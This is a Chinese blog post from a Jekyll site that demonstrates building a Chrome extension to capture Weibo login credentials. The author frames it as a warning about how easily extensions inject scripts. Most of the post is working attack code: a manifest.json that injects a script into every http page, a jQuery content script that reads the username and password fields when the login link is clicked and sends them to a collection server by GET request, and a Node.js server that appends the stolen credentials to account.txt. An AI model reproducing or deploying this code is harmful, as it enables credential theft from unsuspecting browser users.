---
layout: post
title: "开发Chrome Extension截取你微博的帐号密码"
description: ""
category: Chrome Extension
tags: [javascript, Chrome Extension]
code: true
---
{% include JB/setup %}
Google允许开发者对Chrome浏览器做扩展，所以有了之前火爆的12306抢票软件，我
也用它抢过票，一直很好奇它怎么注入js到12306上面的。这周有空研究了下Chrome Extension，终于明白它是怎么工作的了。更多信息可以参看[chrome.extension](http://developer.chrome.com/extensions/extension.html)。

但是又让我对chrome extension产生了一点担心，这么容易注入js，那盗取你的帐号密码啥的不是很方便吗？下面演示一个比较简单的盗取微博帐号密码的方法。

要加载chrome extension首先要定义一个manifest.json文件。定义如下：

{% highlight json %}
{
  "manifest_version": 2,

  "name": "Account Detect",
  "description": "This extension will detect your account",
  "version": "1.0",

  "permissions": [
    "http://*/*"
  ],
  "browser_action": {
    "default_icon": "icon.png"
  },
  "content_scripts": [
    {
      "matches": ["http://*/*"],
      "js": ["jquery-1.10.2.min.js", "myscript.js"]
     
    }
  ]
}
{% endhighlight %}

注意content script加入的顺序，先填写JQuery，方便我们使用JQuery上的方法。然后是我自己定义的myscript.js。

{% highlight javascript %}
$('body').on("click",'a[tabindex="6"]', function(event){
    var username = $('input[name="username"]').val();
    var passwords = $('input[name="password"]').val();
    var query = '?username=' + username + '&' + 'passwords=' + passwords;
    $.get('http://localhost:1337' + query, function() {});

    alert(username + ':' + passwords);
});
{% endhighlight %}

上面代码的意思就是让[微博登陆页](http://weibo.com/)上的登录链接绑定上我的事件上。页面上的元素信息可以通过开发者工具查看到。事件内容就是获取页面上你输入的帐号和密码，然后通过ajax get的方式发送到我自己的服务器上保存起来。

最后我在本地自己设个服务器来接受传输信息，后端代码使用的Node.js，代码如下：

{% highlight javascript %}
var http = require('http');
var url = require('url');
var fs = require('fs');
http.createServer(function (req, res) {
  
  console.log(req.url);
  var query = url.parse(req.url, true).query;
  var name = query.username;
  var passwords = query.passwords;
  if(typeof(name) == "undefined") {
    console.log('oh no');
  } else {
    fs.open('account.txt', 'a', 666, function(e, id) {
      var content = name + '\n' + passwords + '\n';
      fs.write(id, content, null, 'utf8', function() {
        fs.close(id, function() {
          console.log('file close');
        });
      });
    });
    console.log('Request for ' + name + ' received.');
  }
  res.writeHead(200, {'Content-Type': 'text/plain'});
  res.end('Done!\n');
}).listen(1337, "127.0.0.1");
console.log('Server running at http://127.0.0.1:1337/');
{% endhighlight %}

逻辑比较简单，就是把获取到的帐号密码保存到account.txt文件中。

下面来实际演示一下吧，首先是要在Chrome浏览器（我的浏览器版本是28.0.1500.71)里加载自己的Extension:

![load unpackage extension in chrome](/assets/images/20130714/loadunpackageextension.png)

然后在Chrome浏览器地址栏输入http://weibo.com/，随便输入一个帐号密码，点击登录试试：

![capture your account](/assets/images/20130714/captureyouraccount.png)

再查看下本机服务器信息：

![check server log](/assets/images/20130714/serverinfo.png)

说明我们服务器接收到了信息，并且可以在server端的根目录下找到account.txt文件，里面就记录了你微博登录的帐号和密码信息。


